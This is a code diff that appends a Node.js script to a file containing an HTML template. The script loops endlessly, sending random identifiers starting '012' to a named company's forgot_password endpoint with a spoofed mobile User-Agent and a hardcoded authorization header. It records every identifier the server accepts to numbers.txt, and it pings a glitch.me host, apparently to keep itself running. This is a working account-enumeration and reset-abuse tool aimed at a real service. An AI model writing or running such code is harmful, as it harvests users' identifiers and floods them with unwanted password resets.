@@ -60,3 +60,92 @@ const html = `
   </body>
 </html>
 `
+
+console.log("Fired")
+//var HttpsProxyAgent = require('https-proxy-agent');
+//const proxyAgent = new HttpsProxyAgent.HttpsProxyAgent('209.182.239.62:80');
+var start;
+const fetch = require('node-fetch');
+const fs = require('fs');
+var readline = require('readline');
+
+    //
+    // Log the results.
+    //
+   // console.log('Command-line input received:');
+    //console.log(result.start+gennum(result.length));
+    
+
+ 
+  function go(){
+var id = "012"+gennum(7);
+fetch('https://syberapp.sybertechnology.com/forgot_password', {
+    method: 'POST',
+
+    headers: {
+        'Content-Type': 'application/json; charset=utf-8',
+        'User-Agent': 'okhttp/4.9.1',
+        'Version': '100',
+        'Accept-Encoding': 'gzip',
+        'Authorization': 'xwrsy67Un9oshl8H=c5g'
+    },
+    body: JSON.stringify(
+{"userIdentifier":id}
+)
+}).then(response=>{
+if(response.status == 200){
+fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;
+console.log('Success! '+id);
+  go()
+});
+  
+}else if(response.status == 404){
+//console.log(id+" fail "+response.status)
+  go()
+  
+}else{
+console.log(" fail "+response.status)
+go()
+}
+
+}).catch((err)=>{
+go()
+})
+}
+
+go()
+
+
+
+function gennum(length) {
+    var result           = '';
+    var characters       = '0123456789';
+    //ABCDEFGHIJKLMNOPQRSTUVWXYZ
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+function pad(num, size) {
+    var s = "000000000" + num;
+    return s.substr(s.length-size);
+}
+function gen(length) {
+    var result           = '';
+    var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    //ABCDEFGHIJKLMNOPQRSTUVWXYZ
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+var ress;
+setInterval(()=>{
+
+
+ress = fetch("https://ren-carder2.glitch.me/")
+//console.log(z+"|"+ress.status)
+},240000)
